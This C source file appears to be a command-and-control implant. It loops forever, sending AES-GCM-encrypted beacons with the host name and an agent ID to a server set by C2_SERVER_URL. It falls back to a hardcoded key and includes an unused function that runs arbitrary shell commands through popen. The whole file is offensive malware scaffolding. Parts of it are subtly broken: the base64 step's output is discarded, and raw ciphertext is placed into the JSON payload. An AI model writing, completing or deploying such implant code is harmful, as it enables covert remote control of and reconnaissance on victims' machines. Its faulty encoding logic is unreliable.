#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define AES_256_KEY_SIZE 32
#define GCM_IV_SIZE 12
#define GCM_TAG_SIZE 16
#define MAX_PAYLOAD 4096
#define BEACON_INTERVAL 60

typedef struct {
    char server_url[512];
    unsigned char key[AES_256_KEY_SIZE];
    char agent_id[64];
} agent_config;

typedef struct {
    char *data;
    size_t size;
} memory_buffer;

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total_size = size * nmemb;
    memory_buffer *buf = (memory_buffer *)userp;
    char *ptr = realloc(buf->data, buf->size + total_size + 1);
    if (!ptr) return 0;
    buf->data = ptr;
    memcpy(&(buf->data[buf->size]), contents, total_size);
    buf->size += total_size;
    buf->data[buf->size] = '\0';
    return total_size;
}

int encrypt_data(const unsigned char *plaintext, int plaintext_len,
                 const unsigned char *key, unsigned char *ciphertext,
                 int *ciphertext_len) {
    unsigned char iv[GCM_IV_SIZE];
    unsigned char tag[GCM_TAG_SIZE];

    if (RAND_bytes(iv, sizeof(iv)) != 1) return -1;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0;
    int ret = 1;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        ret = -1;
        goto cleanup;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_SIZE, NULL) != 1) {
        ret = -1;
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        ret = -1;
        goto cleanup;
    }

    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        ret = -1;
        goto cleanup;
    }
    *ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        ret = -1;
        goto cleanup;
    }
    *ciphertext_len += len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_SIZE, tag) != 1) {
        ret = -1;
        goto cleanup;
    }

    memcpy(ciphertext + *ciphertext_len, tag, GCM_TAG_SIZE);
    memcpy(ciphertext + *ciphertext_len + GCM_TAG_SIZE, iv, GCM_IV_SIZE);
    *ciphertext_len += GCM_TAG_SIZE + GCM_IV_SIZE;

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    return ret;
}

int decrypt_data(const unsigned char *ciphertext, int ciphertext_len,
                 const unsigned char *key, unsigned char *plaintext,
                 int *plaintext_len) {
    unsigned char iv[GCM_IV_SIZE];
    unsigned char tag[GCM_TAG_SIZE];

    int ct_len = ciphertext_len - GCM_TAG_SIZE - GCM_IV_SIZE;
    if (ct_len < 0) return -1;

    memcpy(iv, ciphertext + ct_len + GCM_TAG_SIZE, GCM_IV_SIZE);
    memcpy(tag, ciphertext + ct_len, GCM_TAG_SIZE);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0;
    int ret = 1;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        ret = -1;
        goto cleanup;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_SIZE, NULL) != 1) {
        ret = -1;
        goto cleanup;
    }
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        ret = -1;
        goto cleanup;
    }

    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ct_len) != 1) {
        ret = -1;
        goto cleanup;
    }
    *plaintext_len = len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_SIZE, (void *)tag) != 1) {
        ret = -1;
        goto cleanup;
    }

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        ret = -1;
        goto cleanup;
    }
    *plaintext_len += len;

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    return ret;
}

char *execute_command(const char *cmd) {
    FILE *pipe = popen(cmd, "r");
    if (!pipe) return strdup("popen failed");

    static char output[MAX_PAYLOAD];
    output[0] = '\0';

    char line[512];
    size_t total = 0;
    while (fgets(line, sizeof(line), pipe) != NULL) {
        size_t line_len = strlen(line);
        if (total + line_len < MAX_PAYLOAD - 1) {
            strcat(output, line);
            total += line_len;
        }
    }
    int status = pclose(pipe);
    (void)status;
    return output;
}

void beacon(agent_config *config) {
    unsigned char plaintext[MAX_PAYLOAD];
    unsigned char ciphertext[MAX_PAYLOAD + 64];
    int ct_len = 0;

    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname));
    time_t now = time(NULL);

    snprintf((char *)plaintext, MAX_PAYLOAD,
             "{\"agent_id\":\"%s\",\"system_info\":{"
             "\"hostname\":\"%s\",\"os\":\"linux\"},"
             "\"timestamp\":%ld}",
             config->agent_id, hostname, (long)now);

    int pt_len = strlen((char *)plaintext);

    if (encrypt_data(plaintext, pt_len, config->key, ciphertext, &ct_len) != 1) {
        fprintf(stderr, "[Agent] Encryption failed\n");
        return;
    }

    char b64_payload[MAX_PAYLOAD * 2];
    FILE *b64_pipe = popen("base64 -w0", "w");
    if (b64_pipe) {
        fwrite(ciphertext, 1, ct_len, b64_pipe);
        pclose(b64_pipe);
        snprintf(b64_payload, sizeof(b64_payload), "{\"payload\":\"%s\"}", ciphertext);
    } else {
        snprintf(b64_payload, sizeof(b64_payload), "{\"payload\":\"\"}");
    }

    CURL *curl = curl_easy_init();
    if (!curl) return;

    memory_buffer response = {NULL, 0};

    char post_url[600];
    snprintf(post_url, sizeof(post_url), "%s/api/v1/beacon", config->server_url);

    curl_easy_setopt(curl, CURLOPT_URL, post_url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, b64_payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        printf("[Agent] Beacon sent, HTTP %ld\n", http_code);
    } else {
        fprintf(stderr, "[Agent] Beacon failed: %s\n", curl_easy_strerror(res));
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (response.data) free(response.data);
}

int main(int argc, char *argv[]) {
    agent_config config;
    memset(&config, 0, sizeof(config));

    const char *env_url = getenv("C2_SERVER_URL");
    const char *env_key = getenv("C2_SECRET_KEY");

    if (env_url) {
        strncpy(config.server_url, env_url, sizeof(config.server_url) - 1);
    } else {
        strncpy(config.server_url, "http://localhost:8080", sizeof(config.server_url) - 1);
    }

    if (env_key) {
        size_t key_len = strlen(env_key);
        if (key_len > AES_256_KEY_SIZE) key_len = AES_256_KEY_SIZE;
        memcpy(config.key, env_key, key_len);
        if (key_len < AES_256_KEY_SIZE) {
            memset(config.key + key_len, 0, AES_256_KEY_SIZE - key_len);
        }
    } else {
        memset(config.key, 'K', AES_256_KEY_SIZE);
    }

    unsigned char id_bytes[6];
    RAND_bytes(id_bytes, 6);
    for (int i = 0; i < 6; i++) {
        static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        config.agent_id[i * 2] = b64_chars[id_bytes[i] >> 2];
        config.agent_id[i * 2 + 1] = b64_chars[(id_bytes[i] & 0x03) << 4];
    }
    config.agent_id[12] = '\0';

    curl_global_init(CURL_GLOBAL_ALL);

    printf("[C Agent] ID: %s\n", config.agent_id);
    printf("[C Agent] Server: %s\n", config.server_url);

    while (1) {
        beacon(&config);
        sleep(BEACON_INTERVAL);
    }

    curl_global_cleanup();
    return 0;
}
